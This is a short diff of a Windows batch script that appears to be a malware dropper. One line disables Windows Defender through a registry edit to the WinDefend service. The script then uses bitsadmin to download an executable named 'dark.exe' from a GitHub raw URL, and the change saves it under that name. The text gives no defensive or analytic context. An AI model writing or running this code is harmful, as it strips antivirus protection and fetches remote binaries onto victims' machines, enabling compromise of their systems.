@@ -63,7 +63,7 @@ reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWO
 
 @echo off
 set "url=https://github.com/ArtunK/my-app/raw/main/dark.exe"
-set "filename=full.bat"
+set "filename=dark.exe"
 
 rem Dosyayı indir (bitsadmin kullanımı)
 bitsadmin /transfer mydownloadjob /download /priority normal %url% %filename%
